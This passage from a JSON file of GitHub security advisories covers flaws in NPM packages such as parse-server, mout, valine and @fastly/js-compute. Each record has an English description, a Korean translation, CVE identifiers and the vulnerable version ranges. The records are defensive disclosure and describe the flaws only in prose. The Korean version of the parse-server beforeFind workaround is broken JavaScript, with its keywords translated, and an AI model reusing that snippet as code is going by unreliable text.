    "description": "### Impact\n\nValidation of the authentication adapter app ID for _Facebook_ and _Spotify_ may be circumvented.\n\nThis fixes a vulnerability that affects configurations which allow users to authenticate using the Parse Server authentication adapter for _Facebook_ or _Spotify_ and where the server-side authentication adapter configuration `appIds` is set as a string (e.g. `abc`) instead of an array of strings (e.g. `[\"abc\"]`). The vulnerability makes it possible to authenticate requests which are coming from a _Facebook_ or _Spotify_ app with a different app ID than the one specified in the `appIds` configuration.\n\nBoth adapters still validate the access token with the respective authentication provider. An app ID is automatically assigned by the authentication provider. For this vulnerability to be exploited, an attacker would have to be assigned an app ID by the authentication provider which is a sub-set of the server-side configured app ID.\n\nThe documentation did not explicitly specify that the parameter `appIds` must be set as an array of strings and setting a string also worked. Therefore, there is a possibility that there are deployments where `appIds` is set as a string, making them vulnerable.\n\n### Patches\n\nThe fix makes Parse Server check the type of the value set for `appIds` and throws an error if the value is not an array.\n\n### Workarounds\n\nNo known workarounds.\n\n### References\n\n- GitHub advisory [GHSA-r657-33vp-gp22](https://github.com/parse-community/parse-server/security/advisories/GHSA-r657-33vp-gp22)",
    "identifiers": "GHSA : GHSA-r657-33vp-gp22\nCVE : CVE-2022-39231",
    "severity": "LOW",
    "updatedAt": "2023-01-27T05:06:59Z",
    "publishedAt": "2022-09-21T20:43:57Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-r657-33vp-gp22\nhttps://github.com/parse-community/parse-server/commit/8c8ec715739e0f851338cfed794409ebac66c51b\nhttps://github.com/parse-community/parse-server/releases/tag/4.10.16\nhttps://github.com/parse-community/parse-server/releases/tag/5.2.7\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39231\nhttps://github.com/advisories/GHSA-r657-33vp-gp22",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.2.7",
    "identifier": "5.2.7",
    "descriptionKR": "### 영향\n\n_Facebook_ 및 _Spotify_에 대한 인증 어댑터 앱 ID의 유효성 검사가 우회될 수 있습니다.\n\n이는 사용자가 _Facebook_ 또는 _Spotify_용 Parse Server 인증 어댑터를 사용하여 인증할 수 있도록 하고 서버측 인증 어댑터 구성 `appIds`가 배열 대신 문자열(예: `abc`)로 설정되는 구성에 영향을 미치는 취약성을 수정합니다 문자열(예: `[\"abc\"]`). 이 취약점으로 인해 `appIds` 구성에 지정된 것과 다른 앱 ID를 사용하여 _Facebook_ 또는 _Spotify_ 앱에서 오는 요청을 인증할 수 있습니다.\n\n두 어댑터는 여전히 각각의 인증 공급자를 통해 액세스 토큰의 유효성을 검사합니다. 앱 ID는 인증 공급자가 자동으로 할당합니다. 이 취약성이 악용되려면 서버 측에 구성된 앱 ID의 하위 집합인 인증 공급자가 공격자에게 앱 ID를 할당해야 합니다.\n\n설명서에는 `appIds` 매개변수를 문자열 배열로 설정해야 한다고 명시적으로 지정하지 않았으며 문자열 설정도 작동했습니다. 따라서 `appIds`가 문자열로 설정되어 취약한 배포가 있을 가능성이 있습니다.\n\n### 패치\n\n이 수정 사항은 Parse Server가 `appIds`에 대해 설정된 값의 유형을 확인하고 값이 배열이 아닌 경우 오류를 발생시킵니다.\n\n### 해결 방법\n\n알려진 해결 방법이 없습니다.\n\n### 참조\n\n- GitHub 권고 [GHSA-r657-33vp-gp22](https://github.com/parse-community/parse-server/security/advisories/GHSA-r657-33vp-gp22)"
  },
  {
    "description": "### Impact\n\nValidation of the authentication adapter app ID for _Facebook_ and _Spotify_ may be circumvented.\n\nThis fixes a vulnerability that affects configurations which allow users to authenticate using the Parse Server authentication adapter for _Facebook_ or _Spotify_ and where the server-side authentication adapter configuration `appIds` is set as a string (e.g. `abc`) instead of an array of strings (e.g. `[\"abc\"]`). The vulnerability makes it possible to authenticate requests which are coming from a _Facebook_ or _Spotify_ app with a different app ID than the one specified in the `appIds` configuration.\n\nBoth adapters still validate the access token with the respective authentication provider. An app ID is automatically assigned by the authentication provider. For this vulnerability to be exploited, an attacker would have to be assigned an app ID by the authentication provider which is a sub-set of the server-side configured app ID.\n\nThe documentation did not explicitly specify that the parameter `appIds` must be set as an array of strings and setting a string also worked. Therefore, there is a possibility that there are deployments where `appIds` is set as a string, making them vulnerable.\n\n### Patches\n\nThe fix makes Parse Server check the type of the value set for `appIds` and throws an error if the value is not an array.\n\n### Workarounds\n\nNo known workarounds.\n\n### References\n\n- GitHub advisory [GHSA-r657-33vp-gp22](https://github.com/parse-community/parse-server/security/advisories/GHSA-r657-33vp-gp22)",
    "identifiers": "GHSA : GHSA-r657-33vp-gp22\nCVE : CVE-2022-39231",
    "severity": "LOW",
    "updatedAt": "2023-01-27T05:06:59Z",
    "publishedAt": "2022-09-21T20:43:57Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-r657-33vp-gp22\nhttps://github.com/parse-community/parse-server/commit/8c8ec715739e0f851338cfed794409ebac66c51b\nhttps://github.com/parse-community/parse-server/releases/tag/4.10.16\nhttps://github.com/parse-community/parse-server/releases/tag/5.2.7\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39231\nhttps://github.com/advisories/GHSA-r657-33vp-gp22",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.10.16",
    "identifier": "4.10.16",
    "descriptionKR": "### 영향\n\n_Facebook_ 및 _Spotify_에 대한 인증 어댑터 앱 ID의 유효성 검사가 우회될 수 있습니다.\n\n이는 사용자가 _Facebook_ 또는 _Spotify_용 Parse Server 인증 어댑터를 사용하여 인증할 수 있도록 하고 서버측 인증 어댑터 구성 `appIds`가 배열 대신 문자열(예: `abc`)로 설정되는 구성에 영향을 미치는 취약성을 수정합니다 문자열(예: `[\"abc\"]`). 이 취약점으로 인해 `appIds` 구성에 지정된 것과 다른 앱 ID를 사용하여 _Facebook_ 또는 _Spotify_ 앱에서 오는 요청을 인증할 수 있습니다.\n\n두 어댑터는 여전히 각각의 인증 공급자를 통해 액세스 토큰의 유효성을 검사합니다. 앱 ID는 인증 공급자가 자동으로 할당합니다. 이 취약성이 악용되려면 서버 측에 구성된 앱 ID의 하위 집합인 인증 공급자가 공격자에게 앱 ID를 할당해야 합니다.\n\n설명서에는 `appIds` 매개변수를 문자열 배열로 설정해야 한다고 명시적으로 지정하지 않았으며 문자열 설정도 작동했습니다. 따라서 `appIds`가 문자열로 설정되어 취약한 배포가 있을 가능성이 있습니다.\n\n### 패치\n\n이 수정 사항은 Parse Server가 `appIds`에 대해 설정된 값의 유형을 확인하고 값이 배열이 아닌 경우 오류를 발생시킵니다.\n\n### 해결 방법\n\n알려진 해결 방법이 없습니다.\n\n### 참조\n\n- GitHub 권고 [GHSA-r657-33vp-gp22](https://github.com/parse-community/parse-server/security/advisories/GHSA-r657-33vp-gp22)"
  },
  {
    "description": "### Impact\n\nThis issue allows a client of the API to retrieve more information than the client’s OAuth scope permits when making “search-type” requests. This issue would not allow a client to retrieve information about individuals other than those the client was already authorized to access.\n\n### Patches\n\nWe recommend that users of fhir-works-on-aws-authz-smart 3.1.1 or 3.1.2 upgrade to version 3.1.3 or higher immediately. Versions 3.1.0 and below are unaffected.\n\n### Workarounds\n\nThere is no workaround for this issue. Please upgrade fhir-works-on-aws-authz-smart to version 3.1.3 or higher.\n\n### References\n\nhttps://github.com/awslabs/fhir-works-on-aws-deployment\nhttps://github.com/awslabs/fhir-works-on-aws-authz-smart\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\nEmail us at [fhir-works-on-aws-dev@amazon.com](mailto:fhir-works-on-aws-dev@amazon.com)\n",
    "identifiers": "GHSA : GHSA-vv7x-7w4m-q72f\nCVE : CVE-2022-39230",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:07:29Z",
    "publishedAt": "2022-09-21T20:36:50Z",
    "references": "https://github.com/awslabs/fhir-works-on-aws-authz-smart/security/advisories/GHSA-vv7x-7w4m-q72f\nhttps://github.com/awslabs/fhir-works-on-aws-authz-smart/commit/203bbc0dd17de748c36b33c68b866ed2dfd613d3\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39230\nhttps://github.com/advisories/GHSA-vv7x-7w4m-q72f",
    "name": "fhir-works-on-aws-authz-smart",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.1.1, < 3.1.3",
    "identifier": "3.1.3",
    "descriptionKR": "### 영향\n\n이 문제로 인해 API 클라이언트는 \"검색 유형\" 요청을 할 때 클라이언트의 OAuth 범위가 허용하는 것보다 더 많은 정보를 검색할 수 있습니다. 이 문제는 클라이언트가 이미 액세스 권한이 있는 개인 이외의 개인에 대한 정보를 검색하는 것을 허용하지 않습니다.\n\n### 패치\n\nfhir-works-on-aws-authz-smart 3.1.1 또는 3.1.2 사용자는 즉시 버전 3.1.3 이상으로 업그레이드하는 것이 좋습니다. 3.1.0 이하 버전은 영향을 받지 않습니다.\n\n### 해결 방법\n\n이 문제에 대한 해결 방법은 없습니다. fhir-works-on-aws-authz-smart를 버전 3.1.3 이상으로 업그레이드하십시오.\n\n### 참조\n\nhttps://github.com/awslabs/fhir-works-on-aws-deployment\nhttps://github.com/awslabs/fhir-works-on-aws-authz-smart\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n[fhir-works-on-aws-dev@amazon.com](mailto:fhir-works-on-aws-dev@amazon.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\n\nA foreign user can write to the session object of another user if the session object ID is known. For example, a foreign user can assign the session object to their own user by writing to the `user` field and then read any custom fields of that session object.\n\nNote that assigning a session to a foreign user does not usually change the privileges of neither of the two users, according to how Parse Server uses session objects internally. However, if custom logic is used to relate specific session objects to privileges this vulnerability may have a higher level of severity.\n\nThe vulnerability does not allow a foreign user to assign a session object to themselves, read the session token, and then reassign the session object to the original user to then authenticate as that user with the known session token. The vulnerability only exists for foreign session objects, a user cannot assign their own session to another user.\n\nWhile it is unlikely that the session object ID of another user is known, it is possible to brute-force guess an object ID, even though the attacker would not know to which user a successfully guessed session object ID belongs.\n\n### Patches\n\nThe fix prevents writing to foreign session objects, even if the session object ID is known.\n\n### Workarounds\n\nAdd a `beforeSave` trigger to the `_Session` class and prevent writing if the requesting user is different from the user in the session object.\n\n### References\n\n- GitHub advisory [GHSA-6w4q-23cf-j9jp](https://github.com/parse-community/parse-server/security/advisories/GHSA-6w4q-23cf-j9jp)",
    "identifiers": "GHSA : GHSA-6w4q-23cf-j9jp\nCVE : CVE-2022-39225",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:07:29Z",
    "publishedAt": "2022-09-21T18:32:01Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-6w4q-23cf-j9jp\nhttps://github.com/parse-community/parse-server/commit/37fed3062ccc3ef1dfd49a9fc53318e72b3e4aff\nhttps://github.com/parse-community/parse-server/releases/tag/4.10.15\nhttps://github.com/parse-community/parse-server/releases/tag/5.2.6\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39225\nhttps://github.com/advisories/GHSA-6w4q-23cf-j9jp",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.2.6",
    "identifier": "5.2.6",
    "descriptionKR": "### 영향\n\n외부 사용자는 세션 개체 ID를 알고 있는 경우 다른 사용자의 세션 개체에 쓸 수 있습니다. 예를 들어 외부 사용자는 `user` 필드에 쓴 다음 해당 세션 개체의 사용자 정의 필드를 읽어 자신의 사용자에게 세션 개체를 할당할 수 있습니다.\n\n외부 사용자에게 세션을 할당해도 Parse Server가 내부적으로 세션 개체를 사용하는 방식에 따라 일반적으로 두 사용자의 권한은 변경되지 않습니다. 그러나 사용자 지정 논리를 사용하여 특정 세션 개체를 권한과 연결하는 경우 이 취약점의 심각도가 더 높을 수 있습니다.\n\n이 취약점은 외부 사용자가 자신에게 세션 개체를 할당하고 세션 토큰을 읽은 다음 세션 개체를 원래 사용자에게 다시 할당한 다음 알려진 세션 토큰을 사용하여 해당 사용자로 인증하는 것을 허용하지 않습니다. 취약점은 외부 세션 개체에만 존재하며 사용자는 자신의 세션을 다른 사용자에게 할당할 수 없습니다.\n\n다른 사용자의 세션 개체 ID를 알 가능성은 거의 없지만 공격자가 성공적으로 추측한 세션 개체 ID가 속한 사용자가 누구인지 알지 못하더라도 개체 ID를 무차별적으로 추측하는 것은 가능합니다.\n\n### 패치\n\n이 수정 사항은 세션 개체 ID가 알려진 경우에도 외부 세션 개체에 쓰는 것을 방지합니다.\n\n### 해결 방법\n\n`_Session` 클래스에 `beforeSave` 트리거를 추가하고 요청 사용자가 세션 개체의 사용자와 다른 경우 쓰기를 방지합니다.\n\n### 참조\n\n- GitHub 권고 [GHSA-6w4q-23cf-j9jp](https://github.com/parse-community/parse-server/security/advisories/GHSA-6w4q-23cf-j9jp)"
  },
  {
    "description": "### Impact\n\nA foreign user can write to the session object of another user if the session object ID is known. For example, a foreign user can assign the session object to their own user by writing to the `user` field and then read any custom fields of that session object.\n\nNote that assigning a session to a foreign user does not usually change the privileges of neither of the two users, according to how Parse Server uses session objects internally. However, if custom logic is used to relate specific session objects to privileges this vulnerability may have a higher level of severity.\n\nThe vulnerability does not allow a foreign user to assign a session object to themselves, read the session token, and then reassign the session object to the original user to then authenticate as that user with the known session token. The vulnerability only exists for foreign session objects, a user cannot assign their own session to another user.\n\nWhile it is unlikely that the session object ID of another user is known, it is possible to brute-force guess an object ID, even though the attacker would not know to which user a successfully guessed session object ID belongs.\n\n### Patches\n\nThe fix prevents writing to foreign session objects, even if the session object ID is known.\n\n### Workarounds\n\nAdd a `beforeSave` trigger to the `_Session` class and prevent writing if the requesting user is different from the user in the session object.\n\n### References\n\n- GitHub advisory [GHSA-6w4q-23cf-j9jp](https://github.com/parse-community/parse-server/security/advisories/GHSA-6w4q-23cf-j9jp)",
    "identifiers": "GHSA : GHSA-6w4q-23cf-j9jp\nCVE : CVE-2022-39225",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:07:29Z",
    "publishedAt": "2022-09-21T18:32:01Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-6w4q-23cf-j9jp\nhttps://github.com/parse-community/parse-server/commit/37fed3062ccc3ef1dfd49a9fc53318e72b3e4aff\nhttps://github.com/parse-community/parse-server/releases/tag/4.10.15\nhttps://github.com/parse-community/parse-server/releases/tag/5.2.6\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39225\nhttps://github.com/advisories/GHSA-6w4q-23cf-j9jp",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.10.15",
    "identifier": "4.10.15",
    "descriptionKR": "### 영향\n\n외부 사용자는 세션 개체 ID를 알고 있는 경우 다른 사용자의 세션 개체에 쓸 수 있습니다. 예를 들어 외부 사용자는 `user` 필드에 쓴 다음 해당 세션 개체의 사용자 정의 필드를 읽어 자신의 사용자에게 세션 개체를 할당할 수 있습니다.\n\n외부 사용자에게 세션을 할당해도 Parse Server가 내부적으로 세션 개체를 사용하는 방식에 따라 일반적으로 두 사용자의 권한은 변경되지 않습니다. 그러나 사용자 지정 논리를 사용하여 특정 세션 개체를 권한과 연결하는 경우 이 취약점의 심각도가 더 높을 수 있습니다.\n\n이 취약점은 외부 사용자가 자신에게 세션 개체를 할당하고 세션 토큰을 읽은 다음 세션 개체를 원래 사용자에게 다시 할당한 다음 알려진 세션 토큰을 사용하여 해당 사용자로 인증하는 것을 허용하지 않습니다. 취약점은 외부 세션 개체에만 존재하며 사용자는 자신의 세션을 다른 사용자에게 할당할 수 없습니다.\n\n다른 사용자의 세션 개체 ID를 알 가능성은 거의 없지만 공격자가 성공적으로 추측한 세션 개체 ID가 속한 사용자가 누구인지 알지 못하더라도 개체 ID를 무차별적으로 추측하는 것은 가능합니다.\n\n### 패치\n\n이 수정 사항은 세션 개체 ID가 알려진 경우에도 외부 세션 개체에 쓰는 것을 방지합니다.\n\n### 해결 방법\n\n`_Session` 클래스에 `beforeSave` 트리거를 추가하고 요청 사용자가 세션 개체의 사용자와 다른 경우 쓰기를 방지합니다.\n\n### 참조\n\n- GitHub 권고 [GHSA-6w4q-23cf-j9jp](https://github.com/parse-community/parse-server/security/advisories/GHSA-6w4q-23cf-j9jp)"
  },
  {
    "description": "Valine was discovered to contain a remote code execution (RCE) vulnerability which allows attackers to execute arbitrary code via a crafted POST request.",
    "identifiers": "GHSA : GHSA-mcvg-g9wx-v5vx\nCVE : CVE-2022-38545",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-31T05:03:59Z",
    "publishedAt": "2022-09-20T00:00:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-38545\nhttps://github.com/xCss/Valine/issues/400\nhttps://github.com/xCss/Valine/commit/c40826c5816c98d797a6b1ed8b62bddf73ed4f65\nhttps://github.com/xCss/Valine/releases/tag/v1.5.0\nhttps://github.com/advisories/GHSA-mcvg-g9wx-v5vx",
    "name": "valine",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.5.0",
    "identifier": "1.5.0",
    "descriptionKR": "발린은 공격자가 조작된 POST 요청을 통해 임의의 코드를 실행할 수 있는 RCE(원격 코드 실행) 취약점을 포함하고 있는 것으로 밝혀졌습니다."
  },
  {
    "description": "This affects all versions of package mout. The deepFillIn function can be used to 'fill missing properties recursively', while the deepMixIn mixes objects into the target object, recursively mixing existing child objects as well. In both cases, the key used to access the target object recursively is not checked, leading to exploiting this vulnerability. **Note:** This vulnerability derives from an incomplete fix of [CVE-2020-7792](https://security.snyk.io/vuln/SNYK-JS-MOUT-1014544).",
    "identifiers": "GHSA : GHSA-vvv8-xw5f-3f88\nCVE : CVE-2022-21213",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:03:35Z",
    "publishedAt": "2022-06-18T00:00:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21213\nhttps://github.com/mout/mout/blob/master/src/object/deepFillIn.js\nhttps://github.com/mout/mout/blob/master/src/object/deepMixIn.js\nhttps://snyk.io/vuln/SNYK-JS-MOUT-2342654\nhttps://github.com/mout/mout/pull/279\nhttps://github.com/mout/mout/commit/17ffdc2a96417a63a0147156dc045e90d0d14c64\nhttps://github.com/advisories/GHSA-vvv8-xw5f-3f88",
    "name": "mout",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.2.3",
    "identifier": "1.2.4",
    "descriptionKR": "이것은 패키지 mout의 모든 버전에 영향을 미칩니다. deepFillIn 함수는 '누락된 속성을 재귀적으로 채우는' 데 사용할 수 있으며 deepMixIn은 객체를 대상 객체에 혼합하고 기존 하위 객체도 재귀적으로 혼합합니다. 두 경우 모두 대상 개체에 재귀적으로 액세스하는 데 사용되는 키를 확인하지 않아 이 취약점을 악용하게 됩니다. **참고:** 이 취약점은 [CVE-2020-7792](https://security.snyk.io/vuln/SNYK-JS-MOUT-1014544)의 불완전한 수정에서 파생됩니다."
  },
  {
    "description": "### Impact\n\n`Math.random` and `crypto.getRandomValues` methods failed to use sufficiently random values. The initial value to seed the CSPRNG (cryptographically secure pseudorandom number generator) was baked-in to the final WebAssembly module meaning the sequence of numbers generated was predictable for that specific WebAssembly module. An attacker with access to that same WebAssembly module that calls the affected methods could use the fixed seed to predict random numbers generated by these functions. This information could be used to bypass cryptographic security controls, for example to disclose sensitive data encrypted by functions that use these generators.\n\n### Patches\n\nThe problem has been fixed in version 0.5.3.\n\nCorrected `Math.random` and `crypto.getRandomValues` methods to always use sufficiently random values. The previous versions would use a CSPRNG (cryptographically secure pseudorandom number generator) which we would seed with a random value. However, due to our use of Wizer, the initial value to seed the CSPRNG was baked-in to the final WebAssembly module meaning the sequence of numbers generated was predictable for that specific WebAssembly module. The new implementations of both Math.random and `crypto.getRandomValues` do not use a CSPRNG and instead pull random values from WASI (WebAssembly System Interface) libc’s random_get function, which is always a sufficiently random value.\n\n### Workarounds\n\nThere are no workarounds, you must upgrade to version 0.5.3 or later.",
    "identifiers": "GHSA : GHSA-cmr8-5w4c-44v8\nCVE : CVE-2022-39218",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:03:57Z",
    "publishedAt": "2022-09-20T20:45:10Z",
    "references": "https://github.com/fastly/js-compute-runtime/security/advisories/GHSA-cmr8-5w4c-44v8\nhttps://github.com/fastly/js-compute-runtime/commit/65524ffc962644e9fc39f4b368a326b6253912a9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39218\nhttps://github.com/advisories/GHSA-cmr8-5w4c-44v8",
    "name": "@fastly/js-compute",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.4.0, < 0.5.3",
    "identifier": "0.5.3",
    "descriptionKR": "### 영향\n\n`Math.random` 및 `crypto.getRandomValues` 메소드가 충분히 임의의 값을 사용하지 못했습니다. CSPRNG(암호화 보안 의사 난수 생성기)를 시드하기 위한 초기 값은 최종 WebAssembly 모듈에 구워졌습니다. 즉, 특정 WebAssembly 모듈에 대해 생성된 숫자 시퀀스를 예측할 수 있었습니다. 영향을 받는 메서드를 호출하는 동일한 WebAssembly 모듈에 대한 액세스 권한이 있는 공격자는 고정 시드를 사용하여 이러한 함수에서 생성된 난수를 예측할 수 있습니다. 이 정보는 예를 들어 이러한 생성기를 사용하는 기능에 의해 암호화된 민감한 데이터를 공개하기 위해 암호화 보안 제어를 우회하는 데 사용될 수 있습니다.\n\n### 패치\n\n이 문제는 버전 0.5.3에서 수정되었습니다.\n\n항상 충분히 임의의 값을 사용하도록 `Math.random` 및 `crypto.getRandomValues` 메서드를 수정했습니다. 이전 버전에서는 무작위 값을 시드하는 CSPRNG(암호화 보안 의사 난수 생성기)를 사용했습니다. 그러나 Wizer를 사용했기 때문에 CSPRNG를 시드하기 위한 초기 값이 최종 WebAssembly 모듈에 구워졌습니다. 즉, 특정 WebAssembly 모듈에 대해 생성된 숫자 시퀀스를 예측할 수 있었습니다. Math.random 및 `crypto.getRandomValues`의 새로운 구현은 CSPRNG를 사용하지 않고 대신 항상 충분히 임의의 값인 WASI(WebAssembly System Interface) libc의 random_get 함수에서 임의 값을 가져옵니다.\n\n### 해결 방법\n\n해결 방법이 없으므로 버전 0.5.3 이상으로 업그레이드해야 합니다."
  },
  {
    "description": "Affected versions of `slug` are vulnerable to a regular expression denial of service when parsing untrusted user input.\n\nThe issue is low severity, as it takes 50,000 characters to cause the event loop to block for 2 seconds,\n\nAbout 50k characters can block the event loop for 2 seconds.\n\n\n## Recommendation\n\nUpdate to version 0.9.2 or later.",
    "identifiers": "GHSA : GHSA-jxqq-cqm6-pfq9\nCVE : CVE-2017-16117",
    "severity": "MODERATE",
    "updatedAt": "2023-01-12T05:04:56Z",
    "publishedAt": "2018-07-24T20:06:45Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2017-16117\nhttps://github.com/dodo/node-slug/issues/82\nhttps://github.com/advisories/GHSA-jxqq-cqm6-pfq9\nhttps://www.npmjs.com/advisories/537",
    "name": "slug",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.9.1",
    "identifier": "0.9.2",
    "descriptionKR": "영향을 받는 `slug` 버전은 신뢰할 수 없는 사용자 입력을 구문 분석할 때 정규식 서비스 거부에 취약합니다.\n\n이벤트 루프를 2초 동안 차단하는 데 50,000자가 필요하므로 문제의 심각도는 낮습니다.\n\n약 50k 문자는 2초 동안 이벤트 루프를 차단할 수 있습니다.\n\n\n## 추천\n\n버전 0.9.2 이상으로 업데이트하십시오."
  },
  {
    "description": "parse-url prior to 8.1.0 is vulnerable to Misinterpretation of Input. parse-url parses certain http or https URLs incorrectly, identifying the URL's protocol as ssh. It may also parse the host name incorrectly.",
    "identifiers": "GHSA : GHSA-pqw5-jmp5-px4v\nCVE : CVE-2022-3224",
    "severity": "MODERATE",
    "updatedAt": "2023-01-28T05:03:10Z",
    "publishedAt": "2022-09-16T00:00:39Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-3224\nhttps://github.com/ionicabizau/parse-url/commit/9cacf38de02db0fb1358bd6ec04543e523cd6a8e\nhttps://huntr.dev/bounties/3587a567-7fcd-4702-b7c9-d9ca565e3c62\nhttps://github.com/advisories/GHSA-pqw5-jmp5-px4v",
    "name": "parse-url",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 8.1.0",
    "identifier": "8.1.0",
    "descriptionKR": "8.1.0 이전의 parse-url은 잘못된 입력 해석에 취약합니다. parse-url은 특정 http 또는 https URL을 잘못 구문 분석하여 URL의 프로토콜을 ssh로 식별합니다. 호스트 이름을 잘못 구문 분석할 수도 있습니다."
  },
  {
    "description": "### Impact\n\nInternal fields (keys used internally by Parse Server, prefixed by `_`) and protected fields (user defined) can be used as query constraints. Internal and protected fields are removed by Parse Server from query results and are only returned to the client using a valid master key. However, using query constraints, these fields can be guessed by enumerating until Parse Server returns a response object.\n\n### Patches\n\nThe patch requires the master key to use internal and protected fields as query constraints.\n\n### Workarounds\n\nImplement a Parse Cloud Trigger `beforeFind` and manually remove the query constraints, such as:\n\n```js\nParse.Cloud.beforeFind('TestObject', ({ query }) => {\n  for (const key in query._where || []) {\n    // Repeat logic for protected fields\n    if (key.charAt(0) === '_') {\n      delete query._where[key];\n    }\n  }\n});\n```\n\n### References\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-2m6g-crv8-p3c6",
    "identifiers": "GHSA : GHSA-2m6g-crv8-p3c6\nCVE : CVE-2022-36079",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:02:52Z",
    "publishedAt": "2022-09-16T21:17:44Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-2m6g-crv8-p3c6\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36079\nhttps://github.com/parse-community/parse-server/issues/8143\nhttps://github.com/parse-community/parse-server/issues/8144\nhttps://github.com/parse-community/parse-server/commit/634c44acd18f6ee6ec60fac89a2b602d92799bec\nhttps://github.com/parse-community/parse-server/commit/e39d51bd329cd978589983bd659db46e1d45aad4\nhttps://github.com/parse-community/parse-server/releases/tag/4.10.14\nhttps://github.com/parse-community/parse-server/releases/tag/5.2.5\nhttps://github.com/advisories/GHSA-2m6g-crv8-p3c6",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.2.5",
    "identifier": "5.2.5",
    "descriptionKR": "### 영향\n\n내부 필드(Parse Server에서 내부적으로 사용하는 키, 접두어 '_') 및 보호 필드(사용자 정의)를 쿼리 제약 조건으로 사용할 수 있습니다. 내부 및 보호 필드는 쿼리 결과에서 Parse Server에 의해 제거되며 유효한 마스터 키를 사용하는 클라이언트에만 반환됩니다. 그러나 쿼리 제약 조건을 사용하면 Parse Server가 응답 개체를 반환할 때까지 열거하여 이러한 필드를 추측할 수 있습니다.\n\n### 패치\n\n패치는 내부 및 보호 필드를 쿼리 제약 조건으로 사용하기 위해 마스터 키가 필요합니다.\n\n### 해결 방법\n\nParse Cloud Trigger 'beforeFind'를 구현하고 다음과 같은 쿼리 제약 조건을 수동으로 제거합니다.\n\n```js\nParse.Cloud.beforeFind('TestObject', ({ 쿼리 }) => {\n  for (query의 const 키._where || []) {\n    // 보호된 필드에 대한 논리 반복\n    if (key.charAt(0) === '_') {\n      삭제 쿼리._where[key];\n    }\n  }\n});\n```\n\n### 참조\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-2m6g-crv8-p3c6"
  },
  {
    "description": "### Impact\n\nInternal fields (keys used internally by Parse Server, prefixed by `_`) and protected fields (user defined) can be used as query constraints. Internal and protected fields are removed by Parse Server from query results and are only returned to the client using a valid master key. However, using query constraints, these fields can be guessed by enumerating until Parse Server returns a response object.\n\n### Patches\n\nThe patch requires the master key to use internal and protected fields as query constraints.\n\n### Workarounds\n\nImplement a Parse Cloud Trigger `beforeFind` and manually remove the query constraints, such as:\n\n```js\nParse.Cloud.beforeFind('TestObject', ({ query }) => {\n  for (const key in query._where || []) {\n    // Repeat logic for protected fields\n    if (key.charAt(0) === '_') {\n      delete query._where[key];\n    }\n  }\n});\n```\n\n### References\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-2m6g-crv8-p3c6",
    "identifiers": "GHSA : GHSA-2m6g-crv8-p3c6\nCVE : CVE-2022-36079",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:02:52Z",
    "publishedAt": "2022-09-16T21:17:44Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-2m6g-crv8-p3c6\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36079\nhttps://github.com/parse-community/parse-server/issues/8143\nhttps://github.com/parse-community/parse-server/issues/8144\nhttps://github.com/parse-community/parse-server/commit/634c44acd18f6ee6ec60fac89a2b602d92799bec\nhttps://github.com/parse-community/parse-server/commit/e39d51bd329cd978589983bd659db46e1d45aad4\nhttps://github.com/parse-community/parse-server/releases/tag/4.10.14\nhttps://github.com/parse-community/parse-server/releases/tag/5.2.5\nhttps://github.com/advisories/GHSA-2m6g-crv8-p3c6",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.10.14",
    "identifier": "4.10.14",
